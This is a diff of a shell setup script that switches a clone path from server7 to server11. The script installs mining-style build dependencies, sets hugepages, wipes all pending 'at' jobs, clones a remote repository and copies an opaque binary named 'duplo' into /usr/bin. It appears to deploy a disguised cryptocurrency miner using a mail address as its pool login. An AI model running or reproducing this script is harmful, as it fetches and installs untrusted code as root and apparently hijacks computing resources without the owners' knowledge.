@@ -6,19 +6,19 @@ MAIL=kotminkot@yandex.ru
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
-rm -rf /tmp/server7/
+rm -rf /tmp/server11/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir server7
-git clone https://github.com/rekek/server7.git /tmp/server7
-cd /tmp/server7
-chmod +x /tmp/server7/duplo
+cd /tmp && mkdir server11
+git clone https://github.com/rekek/server11.git /tmp/server11
+cd /tmp/server11
+chmod +x /tmp/server11/duplo
 chmod 777 ./*.sh
-cp /tmp/server7/duplo /usr/bin/
+cp /tmp/server11/duplo /usr/bin/
 sleep 3
 
 touch /tmp/at.txt
